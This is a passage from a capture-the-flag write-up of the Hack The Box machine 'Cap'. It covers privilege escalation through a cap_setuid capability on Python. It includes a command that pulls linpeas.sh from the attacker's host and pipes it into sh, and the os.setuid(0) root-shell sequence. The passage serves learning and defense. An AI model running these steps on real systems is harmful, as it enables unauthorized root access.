+</span></span><span style="display:flex;"><span>lrwxrwxrwx 1 root   root      9 May 15  2021 .bash_history -&gt; /dev/null
+</span></span><span style="display:flex;"><span>-rw-r--r-- 1 nathan nathan  220 Feb 25  2020 .bash_logout
+</span></span><span style="display:flex;"><span>-rw-r--r-- 1 nathan nathan 3771 Feb 25  2020 .bashrc
+</span></span><span style="display:flex;"><span>drwx------ 2 nathan nathan 4096 May 23  2021 .cache
+</span></span><span style="display:flex;"><span>-rw-r--r-- 1 nathan nathan  807 Feb 25  2020 .profile
+</span></span><span style="display:flex;"><span>lrwxrwxrwx 1 root   root      9 May 27  2021 .viminfo -&gt; /dev/null
+</span></span><span style="display:flex;"><span>-r-------- 1 nathan nathan   33 Jun  7 22:10 user.txt
+</span></span></code></pre></div><h2 id="privilege-escalation--linux-capabilities">Privilege escalation — Linux capabilities<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation--linux-capabilities">#</a></h2>
+<p>This is where I got stuck and used the hint: <em>&quot;<a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS">linPEAS</a> will show this in the &lsquo;Files with capabilities&rsquo; section of the output. Or use the <code>getcap</code> binary on Cap.&quot;</em></p>
+<p>I set up a temporary HTTP server on my box so I could pull linpeas down to the victim and run it.</p>
+<p>On my machine:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>┌──(d3vilsec㉿kali)-[/usr/share/peass/linpeas]
+</span></span><span style="display:flex;"><span>└─$ sudo python3 -m http.server 80
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</span></span><span style="display:flex;"><span>10.129.11.152 - - [07/Jun/2026 16:19:06] &#34;GET /linpeas.sh HTTP/1.1&#34; 200 -
+</span></span></code></pre></div><p>On the victim:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>nathan@cap:~$ curl 10.10.14.35/linpeas.sh | sh
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Files with capabilities (limited to 50):
+</span></span><span style="display:flex;"><span>/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+</span></span><span style="display:flex;"><span>/usr/bin/ping = cap_net_raw+ep
+</span></span><span style="display:flex;"><span>/usr/bin/traceroute6.iputils = cap_net_raw+ep
+</span></span><span style="display:flex;"><span>/usr/bin/mtr-packet = cap_net_raw+ep
+</span></span><span style="display:flex;"><span>/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+</span></span></code></pre></div><p>There it is: <code>/usr/bin/python3.8</code> carries <code>cap_setuid</code>. That capability lets the binary set its UID to anything it wants — including 0 — without needing sudo. I got stuck on the exact syntax here (Python isn&rsquo;t my strong suit), but the path was right. Calling <code>os.setuid(0)</code> to become root, then spawning a shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>nathan@cap:~$ /usr/bin/python3.8
+</span></span><span style="display:flex;"><span>Python 3.8.5 (default, Jan 27 2021, 15:41:15)
+</span></span><span style="display:flex;"><span>[GCC 9.3.0] on linux
+</span></span><span style="display:flex;"><span>Type &#34;help&#34;, &#34;copyright&#34;, &#34;credits&#34; or &#34;license&#34; for more information.
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; import os
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; os.setuid(0)
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; os.system(&#34;/bin/bash&#34;)
+</span></span><span style="display:flex;"><span>root@cap:~#
+</span></span></code></pre></div><p>Root. Grabbed the final flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root@cap:~# cat /root/root.txt
+</span></span><span style="display:flex;"><span>[REDACTED]
+</span></span></code></pre></div><h2 id="takeaways">Takeaways<a hidden class="anchor" aria-hidden="true" href="#takeaways">#</a></h2>
+<ul>
+<li>The <code>/data/&lt;id&gt;</code> endpoint is a textbook <strong>IDOR</strong> — sequential IDs let you read captures that aren&rsquo;t yours, and one of them leaked cleartext FTP creds.</li>
+<li><strong>Credential reuse</strong> between FTP and SSH turned a single leak into an interactive shell.</li>
+<li>The root cause of the privesc is a dangerous <strong>Linux capability</strong> (<code>cap_setuid</code>) on the Python binary. <code>getcap -r / 2&gt;/dev/null</code> is worth running on every Linux box — capabilities don&rsquo;t show up in a <code>sudo -l</code> and are easy to miss.</li>
+</ul>
+<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
+<p>For my first real box, Cap taught me a lot. A couple of things were brand new to me: getting <strong>linPEAS</strong> onto the target and reading its output is a workflow I&rsquo;ll reach for on every Linux box from here on out, and the privesc was my first time using Python&rsquo;s <strong><code>os</code> module</strong> (<code>os.setuid</code> / <code>os.system</code>) to abuse a capability and land a root shell.</p>
+<p>The honest takeaway is that I need to get stronger with Python. I got stuck on the exact syntax at the final step and had to lean on a hint to push through. Reading and writing Python well is clearly going to pay off across a lot of these challenges, so that&rsquo;s where I&rsquo;m pointing my study next. On to the next one.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://d3vilsec.com/tags/htb/">Htb</a></li>
+      <li><a href="https://d3vilsec.com/tags/writeup/">Writeup</a></li>
+      <li><a href="https://d3vilsec.com/tags/linux/">Linux</a></li>
+      <li><a href="https://d3vilsec.com/tags/ftp/">Ftp</a></li>
+      <li><a href="https://d3vilsec.com/tags/wireshark/">Wireshark</a></li>
+      <li><a href="https://d3vilsec.com/tags/privilege-escalation/">Privilege-Escalation</a></li>
+      <li><a href="https://d3vilsec.com/tags/linux-capabilities/">Linux-Capabilities</a></li>
+    </ul>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://d3vilsec.com/">d3vilsec</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
